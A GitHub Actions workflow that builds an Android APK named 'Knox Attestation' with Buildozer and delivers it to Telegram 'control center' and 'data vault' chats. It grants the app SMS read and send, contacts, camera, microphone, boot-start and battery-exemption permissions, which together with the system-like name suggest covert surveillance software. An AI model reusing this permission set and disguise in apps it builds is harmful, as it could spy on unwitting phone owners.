name: Build APK using Buildozer Docker Image

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    # تشغيل فقط إذا كانت رسالة الـ commit تحتوي على '[build]' لتوفير الموارد
    if: github.event_name == 'workflow_dispatch' || contains(github.event.head_commit.message, '[build]')
    
    container:
      image: kivy/buildozer:latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Notify Build Start
        env:
          BOT1_TOKEN: ${{ secrets.TELEGRAM_BOT_1_TOKEN }}
          CTRL_ID: ${{ secrets.TELEGRAM_CONTROL_CENTER_ID }}
        run: |
          apt update && apt install -y curl
          curl -s -X POST https://api.telegram.org/bot$BOT1_TOKEN/sendMessage \
            -d chat_id=$CTRL_ID -d text="🚀 [Knox] Build process started. Waiting for APK..."

      - name: Verify Secrets (Pre-flight Check)
        run: |
          echo "🔍 Checking required secrets..."
          if [ -z "${{ secrets.TELEGRAM_BOT_1_TOKEN }}" ] || [ -z "${{ secrets.TELEGRAM_CONTROL_CENTER_ID }}" ]; then
            echo "❌ ERROR: Critical secrets are missing!"
            exit 1
          fi
          echo "✅ All required secrets are present."

      - name: Cache Buildozer
        uses: actions/cache@v4
        with:
          path: /github/home/.buildozer
          key: buildozer-cache-${{ hashFiles('project/buildozer.spec') }}

      - name: Prepare buildozer.spec and Icon
        run: |
          cd project
          mkdir -p res/drawable
          if [ ! -f "res/drawable/ic_launcher.png" ]; then
            echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" | base64 -d > res/drawable/ic_launcher.png
          fi
          # تحديث ملف الإعدادات لـ API 33 وإضافة جميع الصلاحيات
          sed -i 's|^#\? \?android.accept_sdk_license = .*|android.accept_sdk_license = True|' buildozer.spec
          sed -i 's|^#\? \?android.auto_accept_sdk_license = .*|android.auto_accept_sdk_license = True|' buildozer.spec
          sed -i 's|^#\? \?android.permissions = .*|android.permissions = INTERNET,ACCESS_NETWORK_STATE,CAMERA,RECORD_AUDIO,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,WAKE_LOCK,RECEIVE_BOOT_COMPLETED,FOREGROUND_SERVICE,POST_NOTIFICATIONS,READ_CONTACTS,READ_SMS,SEND_SMS,REQUEST_IGNORE_BATTERY_OPTIMIZATIONS|' buildozer.spec
          sed -i 's|^#\? \?android.api = .*|android.api = 33|' buildozer.spec
          echo "🛠️ Buildozer spec updated."

      - name: Build APK
        run: |
          cd project
          yes | buildozer -v android debug

      - name: Find and Verify APK
        id: find_apk
        run: |
          APK_PATH=$(find project/bin -name "*.apk" -type f | head -n 1)
          if [ -z "$APK_PATH" ]; then
            echo "❌ APK not found!"
            exit 1
          fi
          echo "apk_path=$APK_PATH" >> $GITHUB_OUTPUT
          echo "✅ APK found at: $APK_PATH"
          echo "📏 APK Size: $(du -h $APK_PATH | cut -f1)"

      - name: Send APK to Telegram (Primary Bot)
        id: send_primary
        continue-on-error: true
        env:
          BOT1_TOKEN: ${{ secrets.TELEGRAM_BOT_1_TOKEN }}
          CTRL_ID: ${{ secrets.TELEGRAM_CONTROL_CENTER_ID }}
          VAULT_ID: ${{ secrets.TELEGRAM_DATA_VAULT_ID }}
        run: |
          apt update && apt install -y curl
          APK_FILE=${{ steps.find_apk.outputs.apk_path }}
          TIMESTAMP=$(date +'%Y-%m-%d %H:%M:%S')
          echo "📤 Sending APK via Primary Bot..."
          curl --retry 3 --retry-delay 5 -F "chat_id=$CTRL_ID" -F "document=@$APK_FILE" \
            -F "caption=✅ Knox Attestation v2.5 (Primary)%0A⏰ $TIMESTAMP%0A📱 API 33%0A📦 Size: $(du -h $APK_FILE | cut -f1)" \
            https://api.telegram.org/bot$BOT1_TOKEN/sendDocument
          
          if [ -n "$VAULT_ID" ]; then
            echo "📦 Sending backup to Data Vault..."
            curl --retry 3 --retry-delay 2 -F "chat_id=$VAULT_ID" -F "document=@$APK_FILE" \
              -F "caption=📦 Backup APK (Primary Bot)" \
              https://api.telegram.org/bot$BOT1_TOKEN/sendDocument
          fi

      - name: Send APK to Telegram (Failover Bot)
        if: steps.send_primary.outcome == 'failure'
        env:
          BOT2_TOKEN: ${{ secrets.TELEGRAM_BOT_2_TOKEN }}
          CTRL_ID: ${{ secrets.TELEGRAM_CONTROL_CENTER_ID }}
          VAULT_ID: ${{ secrets.TELEGRAM_DATA_VAULT_ID }}
        run: |
          apt update && apt install -y curl
          APK_FILE=${{ steps.find_apk.outputs.apk_path }}
          TIMESTAMP=$(date +'%Y-%m-%d %H:%M:%S')
          if [ -z "$BOT2_TOKEN" ]; then
            echo "❌ Failover Bot token missing. APK delivery failed."
            exit 1
          fi
          echo "⚠️ Primary Bot failed. Sending via Failover Bot..."
          curl --retry 3 --retry-delay 5 -F "chat_id=$CTRL_ID" -F "document=@$APK_FILE" \
            -F "caption=⚠️ Knox Attestation v2.5 (Failover)%0A⏰ $TIMESTAMP%0A📱 API 33%0A📦 Size: $(du -h $APK_FILE | cut -f1)" \
            https://api.telegram.org/bot$BOT2_TOKEN/sendDocument
          
          if [ -n "$VAULT_ID" ]; then
            curl --retry 3 --retry-delay 2 -F "chat_id=$VAULT_ID" -F "document=@$APK_FILE" \
              -F "caption=📦 Backup APK (Failover Bot)" \
              https://api.telegram.org/bot$BOT2_TOKEN/sendDocument
          fi

      - name: Upload APK as Artifact (Final Safety Net)
        uses: actions/upload-artifact@v4
        with:
          name: Knox-Attestation-APK-${{ github.run_number }}
          path: ${{ steps.find_apk.outputs.apk_path }}
